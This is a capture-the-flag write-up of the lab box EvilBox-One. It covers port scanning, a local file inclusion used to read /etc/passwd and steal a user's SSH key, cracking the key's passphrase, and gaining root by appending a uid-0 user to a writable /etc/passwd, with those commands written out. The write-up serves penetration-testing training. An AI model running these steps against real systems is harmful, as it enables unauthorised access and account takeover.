# PG Play - EvilBox-One

#### Ip: 192.168.171.212
#### Name: EvilBox-One
#### Difficulty: Easy
#### Community Rating: Intermediate

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `-sC` and `-sV` flags to use basic scripts and to enumerate versions.

```text
┌──(ryan㉿kali)-[~/PG/EvilBox-One]
└─$ sudo nmap -p-  --min-rate 10000 192.168.171.212 -sC -sV
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 14:25 CDT
Nmap scan report for 192.168.171.212
Host is up (0.081s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 4495500be473a18511ca10ec1ccbd426 (RSA)
|   256 27db6ac73a9c5a0e47ba8d81ebd6d63c (ECDSA)
|_  256 e30756a92563d4ce3901c19ad9fede64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds
```

Heading to the site on port 80 we find a deafault Apache landing page:

site.png

Manually trying for a robots.txt page we find:

hello.png

Fuzzing for directories we find a `/secret/evil.php`

ferox.png

But navigating to the page, its just a blank page. 

Trying a few different directory traversals and continually getting blank pages rather than 404/ Not Found errors, made me wonder if the page was vulnerarble.

We can automate fuzzing for the vulnerabilty with ffuf:

nice, ffuf found something for us.

ffuf.png

We can navigate to http://192.168.171.212/secret/evil.php?command=/etc/passwd and confirm the vulnerability

etc.png

Note: I always prefer to view LFIs in the page source because the formatting is usually cleaner and more readable.

### Exploitation

Its great we found this vulnerability, but in and of itself its not too useful to us yet.

Looking through the `/etc/passwd` file we see there is a user named mowree:

```
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```

Because we now that SSH is also open on the target, lets see if we can access their SSH key:

Nice that worked!

id.png

Chnging the mode and trying to use the key we see it is passphrase protected.

```text
┌──(ryan㉿kali)-[~/PG/EvilBox-One]
└─$ chmod 600 id_rsa
                                                                                                                             
┌──(ryan㉿kali)-[~/PG/EvilBox-One]
└─$ ssh -i id_rsa  mowree@192.168.171.212               
The authenticity of host '192.168.171.212 (192.168.171.212)' can't be established.
ED25519 key fingerprint is SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.171.212' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

No worries, lets try to crack the passphrase using ssh2john:

john.png

Cool, now that we have the passphrase we can SSH in and grab the local.txt flag:

user_flag.png

### Privilege Escalation

Lets transfer over LinPEAS to help with enumeration:

transfer.png

Nice, LinPEAS finds that the `/etc/passwd` file is writable.

write.png

This should be a quick path to root:

```text
mowree@EvilBoxOne:/tmp$ openssl passwd fake
nypzT0GRtIljA
mowree@EvilBoxOne:/tmp$ echo "root2:nypzT0GRtIljA:0:0:root:/root:/bin/bash" >> /etc/passwd
mowree@EvilBoxOne:/tmp$ su root2
Contraseña: 
root@EvilBoxOne:/tmp# whoami
root
```
Nice, that worked. We can now grab the proof.txt flag:

root_flag.png

Thanks for following along!

-Ryan

-----------------------------------------------------



